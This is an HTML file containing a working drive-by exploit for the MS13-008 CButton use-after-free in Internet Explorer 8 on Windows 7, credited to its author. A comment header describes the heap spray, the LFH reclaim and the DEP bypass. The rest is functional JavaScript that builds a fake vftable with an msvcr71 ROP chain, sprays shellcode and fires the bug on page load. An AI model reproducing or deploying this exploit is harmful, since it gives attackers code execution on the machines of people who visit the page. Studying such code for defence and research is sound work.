<!doctype html>
<html>
<head>
<script src="./../Payloads/Compiled/JS/MessageBox_Unescape_BufferOffset4_32-bit.js"></script>
<script>
/*
   _____     _________ ____ ________         _______   _______     ______   
  /     \   /   _____//_   |\_____  \        \   _  \  \   _  \   /  __  \  
 /  \ /  \  \_____  \  |   |  _(__  <  ______/  /_\  \ /  /_\  \  >      <  
/    Y    \ /        \ |   | /       \/_____/\  \_/   \\  \_/   \/   --   \ 
\____|__  //_______  / |___|/______  /        \_____  / \_____  /\______  / 
        \/         \/              \/               \/        \/        \/  
Exploit Title: Internet Explorer 32-bit CButton UAF
Date: 2021-05-24
Exploit Author: deadlock (Forrest Orr)
Vendor Homepage: https://www.microsoft.com/
Software Link: https://www.microsoft.com/en-gb/download/internet-explorer.aspx
Version: IE8 32-bit
Tested on: Windows 7 SP1 Pro x64/Internet Explorer 8 32-bit (8.00.7601.17514)
CVE: MS13-008
Bypasses: DEP, ASLR (dependent upon a non-ASLR module)
Relies on: Java (JRE) v6.45

-------------------------------------------------------------------------------

Overview

This exploit is loosely based on the public Metasploit module for MS13-008 [1].
It is an extremely simple Use-After-Free in the MSHTML.DLL CButton DOM object,
and lacks power to bypass ASLR via infoleak. For this reason I have preserved
the same Msvcr71.dll ROP chain as MSF (a non-ASLR module from Java v6.45) for
my DEP bypass.

Due to its dependence on Windows 7, its UAF re-claim is dependent on LFH LIFO.
It will not be effective on Windows 8.1+.

~

Design

The MSF variation of this exploit uses the MSTIME object trick in order to
dynamically generate a valid vftable address within the fake CButton object at
the dangling pointer. For my variation I chose to use a heap spray, as a
persistent issue I had with the MSTIME object was that the shellcode blocks it
referenced had no space (below their allocation address) for the stack to grow
down, which caused msfvenom and my shellcode to occasionally crash trying to
grow the stack into un-committed memory.

~

Quirks

The <!doctype html> declaration is a compliance standard, without it the exploit
does not trigger. Furthermore, executing the .html file off of a shared drive
will fail by default as it will not trigger the Java plugin to be properly
initialized.

Furthermore separating the HTML from the JS seems to consistently cause issues.
I've separated the shellcode JS from this file, but the main exploit JS has been
left merged with the HTML for stability reaasons.

~

Links

1. https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/browser/ie_cbutton_uaf.rb
*/

var SprayCount = 400; // This is enough to consistently hit 0x0AEB0000
var SprayArray = new Array(SprayCount); // CollectGarbage will free heap sprayed chunks if this is not global.

function DwordArrayToBytes(DwordArray) {
    var ByteArray = [];
    
    for(var i = 0; i < DwordArray.length; i++) {
        ByteArray.push(DwordArray[i] & 0xffff);
        ByteArray.push((DwordArray[i] & 0xffff0000) >> 16);
    }
    
    return String.fromCharCode.apply(null, ByteArray);
}

function CreateUafObject(VtableAddressBytes, Size) {
	var ObjectArray = [];
	
	for (var i = 0; ObjectArray.length < (((Size - 6) / 2) - VtableAddressBytes.length); i++) { // -4 for the BSTR length and -2 for NULL terminator
		ObjectArray[i] = 0x99;
	}
	
	var FinalObject = VtableAddressBytes + String.fromCharCode.apply(null, ObjectArray);
	return FinalObject;
}

function BuildRopNopSled(RopNopAddressBytes, Size) {
    var Obj = "";
    
    while (Obj.length < (Size / 2)) {
        Obj += RopNopAddressBytes;
    }
    
    return Obj;
}
    
function HeapSpray(Content, StartOffset, RegionCount) { // Spray the data specified in Content in 0x10000 chunks within 1MB allocated regions. The starting offset of the content in the 1MB chunks may be 0, or any multiple of 2.
    var PrePadding = unescape("%u1111");
    var TailPadding = unescape("%u2222");
    var Data;
    
    if(StartOffset > 0) {
        Data = PrePadding;
        
        for(var i = 0; i < ((StartOffset / 2) - 1); i++) { // -1 for var init
            Data += PrePadding;
        }
        
        Data += Content
    }
    else {
        Data = Content;
    }
    
    // These are chunks of 0x10000 bytes, then x 16 for 1MB. 0x10000 is the ideal size for heap spray as it ensures consistency, while 1MB is not (they will not always begin at a consistent 1MB multiple). 1MB chunks have a 0x20 header size, others have 0x8. 0x10000 will end up as sub-chunks within the 1MB allocations with no headers. This ensures that any multiple of 0x10000 ie. 0x11a00000, 0x11b00000, etc. will always be hit, and the payload will be at offset 0x24 within them (to accomodate 1MB header size of 0x20 + 4 byte BSTR length).
    
    while (TailPadding.length < (65536/2)) { // This is a fast way of making a large chunk
      TailPadding = TailPadding + TailPadding
    }
    
    Data = Data + TailPadding;
    
    // 65536 * 16 = 1048576 (1MB). Exclude 38 (0x26) bytes for heap chunk header (0x20 bytes), BSTR length (0x4 bytes), null terminator (0x2 bytes).
    
    var SprayChunk = Data.substr(0, 65536/2);
    
    for(var i = 0; i < 14; i++) {
        SprayChunk += Data.substr(0, 65536/2);
    }
    
    SprayChunk += Data.substr(0, (65536/2) - (38/2));
    
    for(var i = 0; i < RegionCount; i++) {
      SprayArray[i] = SprayChunk.substr(0, SprayChunk.length);
    }
}

function CreateFakeVftable() {
    var FakeVtable = BuildRopNopSled(DwordArrayToBytes([0x7C348B06]), (0xDC - 4)); // EIP hijack at CALL [EAX + 0xDC] within mshtml.dll at +0x1AE1E6
    FakeVtable += DwordArrayToBytes([0x7C364C66]); // POP EBP ; RET  gadget to hop over stack pivot at 0xDC after ROPNOP sled from 0x0AEB0024 up to 0x0AEB0100 (+0xDC from start of fake vftable)
    FakeVtable += DwordArrayToBytes([0x7C348B05]); // XCHG EAX, ESP ; RET
    var Msvcr71RopChain = unescape("%u4c66%u7c36%u4c66%u7c36%u4edc%u7c34%ucfff%uffff%u1e05%u7c35%u36e3%u7c35%uffff%uffff%u5255%u7c34%u218e%u7c35%u5937%u7c34%uffc0%uffff%u1eb1%u7c35%uc5b9%u7c36%u1e67%u7c39%u2e58%u7c34%ud202%u7c34%uf8f4%u7c34%u15a2%u7c34%u4edc%u7c34%ua151%u7c37%u8c81%u7c37%u5c30%u7c34");
    FakeVtable += Msvcr71RopChain; // Non-ASLR module from Java v6.45
    FakeVtable += Shellcode;
    return FakeVtable;
}

function ActivateLFH() {
    for(var i = 0; i < 20; i++) {
        document.createElement('button');
    }
}

function TriggerUAF(FakeCButtonObj) {
    BugForm = document.getElementById("BugFormId");
    BugDiv = document.getElementById("BugDivId");

    BugDiv.appendChild(document.createElement('button'));
    BugDiv.firstChild.applyElement(BugForm);
    BugDiv.innerHTML = "";
    BugDiv.appendChild(document.createElement('body'));

    CollectGarbage(); // Trigger the creation of the dangling pointer
	FakeCButtonObj += unescape("%u3333%u3333"); // Take 4 bytes for BSTR length into account (it will be removed using className DIV trick)
    BugDiv.className = FakeCButtonObj.substr(0); // Clone the fake CButton object. Due to LFH, Windows 7 should give it the same address as the freed CButton referenced by the dangling pointer.
}

function Exploit() {
    var Payload = CreateFakeVftable();
    HeapSpray(Payload, 0, SprayCount); // The heap spray is order insensitive in this exploit. It can be here before the LFH, after the LFH before the trigger, after the trigger etc.
    var FakeCButtonObj = CreateUafObject(DwordArrayToBytes([0x0AEB0024]), 0x58); // This object does NOT have a BSTR length field, despite being constructed as a "string" internally
    ActivateLFH();
    TriggerUAF(FakeCButtonObj);
}

</script>
</head>
<body onload="eval(Exploit())">
<div id="BugDivId"></div>
<form id="BugFormId">
</form>
</body>
</html>